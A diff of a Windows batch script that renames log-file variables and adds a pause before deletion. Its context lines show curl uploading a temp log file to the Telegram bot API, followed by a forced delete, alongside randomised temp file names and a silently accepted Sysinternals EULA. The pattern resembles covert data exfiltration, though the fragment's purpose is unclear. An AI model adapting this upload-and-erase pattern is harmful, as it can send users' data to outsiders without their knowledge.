@@ -73,7 +73,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
 
 
 :: Set the log file path
-set "LOGFILE=%temp%\!filename1!"
+set "LOGFILE=%temp%\!filename1!.ustup"
 
 
 
@@ -98,9 +98,9 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" ^
 
 
 
-
-
-
+echo.
+echo Calling ended.
+timeout /t 20 /nobreak
 del /f /q "%LOGFILE%"
 goto :EOF
 
@@ -158,7 +158,7 @@ if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10%
 
 
 
-set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
+set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
 
 
 
@@ -190,7 +190,7 @@ reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
 reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
 reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
 echo Handle LOGFILE TA3 RUNEVERY
-handle.exe "%LOGFILE%"
+handle.exe "%RUNEVERYLOGFILE%"
 echo.
 echo.
 echo.
